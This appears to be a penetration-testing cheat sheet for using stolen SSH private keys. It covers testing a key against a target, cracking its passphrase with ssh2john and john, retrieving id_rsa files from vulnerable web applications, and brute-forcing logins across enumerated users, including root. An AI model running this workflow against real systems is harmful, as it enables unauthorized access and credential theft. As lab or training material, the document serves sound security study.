# SSH Private Keys (id_rsa)

### 1) Quick SSH test (30–60s)

    ssh -i id_rsa user@TARGET -p PORT -o IdentitiesOnly=yes -o BatchMode=yes -vvv

### 2) If SSH says key needs a passphrase or is rejected: — Then Check whether if key is passphrase-protected:

    ssh-keygen -y -f id_rsa >/dev/null && echo “no passphrase” || echo “passphrase-protected or invalid”

### 3) If passphrase-protected — quick crack workflow

- Convert key to hash:

      ssh2john.py id_rsa > hash.txt

- Crack with john:

      john — wordlist=rockyou.txt hash.txt

### 4) Common Libcrypto/format errors

If ssh complains about libcrypto or key format, normalize the file:

    dos2unix ~/.ssh/id_rsa
    vim --clean ~/.ssh/id_rsa
    (inside vim: type :wq then hit Return)

### 5) Discover SSH Keys in a web application

Extract id_rsa keys from a web application in ways that do not render formatting errors.

Curl

    curl "[Vulnerable URL/Request]" -o id_rsa

Alternatively, intercept the successful request and response in Burp Suite. Copy the response body directly from Burp’s interface, which preserves the exact file formatting, and save it locally.

Then give permissions to key

    chmod 600 id_rsa

Login

    ssh -i id_rsa USER@IP

## The General Strategy

#### Trust the Key: If you have successfully extracted the key and ensured its permissions are correct (chmod 400 id_rsa), assume the key is valid and the issue lies with the username.

#### Enumerate Users: Use available information (such as the contents of /etc/passwd, web application user lists, or any credentials you've found) to compile a list of every possible user on the target machine.

#### Brute-Force Users with the Key: Systematically attempt to log in using the extracted key against every user on your list, including users like root or service accounts.

